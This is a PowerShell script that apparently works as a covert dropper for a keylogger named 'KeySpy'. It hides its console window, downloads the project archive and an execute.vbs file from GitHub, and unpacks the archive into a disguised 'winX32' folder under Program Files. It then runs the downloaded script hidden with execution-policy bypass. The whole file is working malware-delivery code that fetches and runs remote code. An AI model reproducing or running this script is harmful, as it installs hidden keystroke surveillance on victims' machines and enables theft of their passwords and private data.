Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
[DllImport("User32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'
$consolePtr = [Console.Window]::GetConsoleWindow()
# Hide the window
[Console.Window]::ShowWindow($consolePtr, 0)

# Define the URL of the zip file
$zipUrl = "https://github.com/3rr0r-505/KeySpy/archive/refs/heads/main.zip"

# Define the URL of the execute.vbs file
$vbsUrl = "https://raw.githubusercontent.com/3rr0r-505/KeySpy/main/execute.vbs"  # Replace "https://example.com/execute.vbs" with the actual URL


# Define the destination folder
$destinationFolder = "C:\Program Files (x86)\winX32"
$destinationPSFolder = "C:\Program Files (x86)\winX32\psScript"

# Define the destination folder for execute.vbs
$destinationTemp = $env:TEMP

# Create the destination folder if it doesn't exist
if (-not (Test-Path -Path $destinationFolder)) {
    New-Item -ItemType Directory -Path $destinationFolder | Out-Null
}

if (-not (Test-Path -Path $destinationPSFolder)) {
    New-Item -ItemType Directory -Path $destinationPSFolder | Out-Null
}

# Download the zip file
Invoke-WebRequest -Uri $zipUrl -OutFile "$destinationFolder\KeySpy.zip" -UseBasicParsing

# Unzip the contents silently and move them directly to the desired location
Expand-Archive -Path "$destinationFolder\KeySpy.zip" -DestinationPath $destinationFolder -Force

# Remove the subfolder created by GitHub in the extraction process
$extractedFolder = Get-ChildItem -Path $destinationFolder -Directory | Where-Object { $_.Name -like "KeySpy-*" }
Move-Item -Path "$destinationFolder\$($extractedFolder.Name)\*" -Destination $destinationFolder -Force
Remove-Item -Path "$destinationFolder\$($extractedFolder.Name)" -Recurse -Force

# Clean up: Remove the zip file
Remove-Item "$destinationFolder\KeySpy.zip" -Force

# Download the execute.vbs file to the temporary folder
$vbsFilePath = Join-Path -Path $destinationTemp -ChildPath "execute.vbs"
Invoke-WebRequest -Uri $vbsUrl -OutFile $vbsFilePath -UseBasicParsing

# Execute the execute.vbs script silently from the temporary folder
Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File '$vbsFilePath'" -NoNewWindow -Wait